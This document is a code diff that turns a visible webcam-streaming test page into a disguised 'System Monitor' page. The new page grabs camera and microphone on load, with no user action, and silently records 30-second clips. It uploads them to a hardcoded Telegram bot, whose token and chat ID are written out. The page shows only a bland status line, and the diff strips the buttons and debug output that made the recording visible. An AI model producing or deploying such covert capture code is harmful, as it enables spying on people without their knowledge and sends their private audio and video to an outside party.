@@ -1,163 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Fixed Stream Test</title>
+  <title>System Monitor</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-    #status { margin: 20px; font-size: 18px; color: green; }
-    #debug { 
-      margin: 10px auto; 
-      padding: 10px; 
-      border: 1px solid #ccc; 
-      text-align: left; 
-      max-width: 600px;
-      max-height: 200px;
-      overflow-y: auto;
+    body {
+      background-color: #f0f0f0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
     }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
+    #status {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #333;
     }
   </style>
 </head>
 <body>
-  <h2>Fixed Streaming Test</h2>
-  <div id="status">Ready to start</div>
-  <div id="debug"></div>
-  <button id="startBtn">Start Streaming</button>
-  <button id="testBtn">Test Telegram Connection</button>
+  <div id="status">System initializing...</div>
 
   <script>
-    // Configuration
+    // Telegram configuration
     const BOT_TOKEN = '7826950594:AAFBygBD_E2PmAITI6zsaPilys7l6i0gWBU';
     const CHAT_ID = '894002841';
     
-    // State
-    let mediaStream;
+    // Stream configuration
+    const CLIP_DURATION = 30000; // 30 seconds
     let mediaRecorder;
-    let isStreaming = false;
-    
-    // Debug output
-    function debugLog(message) {
-      const debugDiv = document.getElementById('debug');
-      debugDiv.innerHTML += `${new Date().toLocaleTimeString()}: ${message}<br>`;
-      debugDiv.scrollTop = debugDiv.scrollHeight;
-      console.log(message);
-    }
-    
-    // Clear debug log
-    function clearDebug() {
-      document.getElementById('debug').innerHTML = '';
-    }
-    
-    // Test Telegram connection
-    async function testBotConnection() {
-      clearDebug();
-      debugLog("Testing Telegram connection...");
-      
-      try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
-        const data = await response.json();
-        
-        if (data.ok) {
-          debugLog(`✅ Bot connected: @${data.result.username}`);
-          return true;
-        } else {
-          debugLog(`❌ Telegram error: ${data.description}`);
-          return false;
-        }
-      } catch (error) {
-        debugLog(`❌ Network error: ${error.message}`);
-        return false;
-      }
-    }
-    
-    // Send test message to Telegram
-    async function sendTestMessage() {
-      debugLog("Sending test message...");
-      
-      try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: 'Test message from streaming app'
-          })
-        });
-        
-        const result = await response.json();
-        if (result.ok) {
-          debugLog("✅ Test message sent successfully");
-        } else {
-          debugLog(`❌ Failed to send: ${result.description}`);
-        }
-      } catch (error) {
-        debugLog(`❌ Network error: ${error.message}`);
-      }
-    }
-    
-    // Convert webm to mp4 (using a simple approach)
-    async function convertWebmToMp4(webmBlob) {
-      debugLog("Converting video format...");
+    let mediaStream;
+    let isActive = false;
+
+    // Convert video format to MP4
+    async function convertToMp4(webmBlob) {
       return new Blob([webmBlob], { type: 'video/mp4' });
     }
-    
+
     // Send video to Telegram
-    async function sendVideoToTelegram(blob) {
-      debugLog("Preparing to send video...");
-      
-      // Convert to MP4 first (Telegram prefers this)
-      const mp4Blob = await convertWebmToMp4(blob);
-      debugLog(`Video size: ${Math.round(mp4Blob.size/1024)}KB`);
-      
-      if (mp4Blob.size > 50 * 1024 * 1024) {
-        debugLog("❌ Video too large (>50MB)");
-        return;
-      }
-      
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('caption', `Stream clip ${new Date().toLocaleTimeString()}`);
-      formData.append('video', mp4Blob, 'stream.mp4');
-      
+    async function sendVideo(blob) {
       try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+        const mp4Blob = await convertToMp4(blob);
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('video', mp4Blob, 'recording.mp4');
+        
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
           method: 'POST',
           body: formData
         });
-        
-        const result = await response.json();
-        if (result.ok) {
-          debugLog("✅ Video sent successfully");
-        } else {
-          debugLog(`❌ Telegram error: ${JSON.stringify(result)}`);
-        }
       } catch (error) {
-        debugLog(`❌ Upload failed: ${error.message}`);
+        console.error('Upload error:', error);
       }
     }
-    
-    // Start media streaming
+
+    // Start background streaming
     async function startStreaming() {
-      if (isStreaming) return;
-      
-      clearDebug();
-      debugLog("Starting streaming process...");
-      
       try {
-        // 1. First test Telegram connection
-        const botConnected = await testBotConnection();
-        if (!botConnected) {
-          document.getElementById('status').textContent = "Fix Telegram connection first";
-          return;
-        }
-        
-        // 2. Get media devices
-        debugLog("Requesting camera access...");
-        document.getElementById('status').textContent = "Requesting permissions...";
-        
+        // Get camera and microphone access
         mediaStream = await navigator.mediaDevices.getUserMedia({
           video: {
             width: { ideal: 640 },
@@ -166,72 +64,58 @@
           },
           audio: true
         });
-        
-        // 3. Setup media recorder
-        debugLog("Setting up recorder...");
-        document.getElementById('status').textContent = "Configuring recorder...";
-        
+
+        // Setup media recorder
         mediaRecorder = new MediaRecorder(mediaStream, {
           mimeType: 'video/webm',
-          videoBitsPerSecond: 500000
+          videoBitsPerSecond: 1000000
         });
-        
+
         mediaRecorder.ondataavailable = async (event) => {
           if (event.data.size > 0) {
-            debugLog(`Captured clip (${Math.round(event.data.size/1024)}KB)`);
-            await sendVideoToTelegram(event.data);
+            await sendVideo(event.data);
           }
         };
-        
-        mediaRecorder.onerror = (event) => {
-          debugLog(`❌ Recorder error: ${event.error.name}`);
+
+        mediaRecorder.start(CLIP_DURATION);
+        isActive = true;
+        document.getElementById('status').textContent = 'System active';
+
+        // Restart recording when stopped
+        mediaRecorder.onstop = () => {
+          if (isActive) {
+            mediaRecorder.start(CLIP_DURATION);
+          }
         };
-        
-        // 4. Start recording
-        mediaRecorder.start(10000); // 10-second clips
-        isStreaming = true;
-        document.getElementById('status').textContent = "Streaming active";
-        debugLog("🎥 Recording started (10-second clips)");
-        
-        // 5. Send initial notification
-        await sendTestMessage();
-        
+
       } catch (error) {
-        isStreaming = false;
-        document.getElementById('status').textContent = "Error occurred";
-        debugLog(`❌ ${error.name}: ${error.message}`);
-        
-        if (error.name === 'NotAllowedError') {
-          debugLog("Please allow camera/microphone permissions");
-        } else if (error.name === 'NotFoundError') {
-          debugLog("No media devices found");
-        }
+        console.error('Streaming error:', error);
+        document.getElementById('status').textContent = 'System inactive';
       }
     }
-    
-    // Stop streaming
-    function stopStreaming() {
+
+    // Clean up resources
+    function cleanup() {
+      isActive = false;
       if (mediaRecorder && mediaRecorder.state !== 'inactive') {
         mediaRecorder.stop();
       }
       if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
       }
-      isStreaming = false;
-      document.getElementById('status').textContent = "Streaming stopped";
-      debugLog("Streaming stopped");
     }
-    
-    // Event listeners
-    document.getElementById('startBtn').addEventListener('click', startStreaming);
-    document.getElementById('testBtn').addEventListener('click', async () => {
-      if (await testBotConnection()) {
-        await sendTestMessage();
+
+    // Start when page loads
+    window.addEventListener('DOMContentLoaded', () => {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        document.getElementById('status').textContent = 'Device not supported';
+        return;
       }
+      startStreaming();
     });
-    
-    // Initialize
-    debugLog("System initialized. Click Start Streaming when ready.");
+
+    // Clean up when page closes
+    window.addEventListener('beforeunload', cleanup);
   </script>
 </body>
 </html>
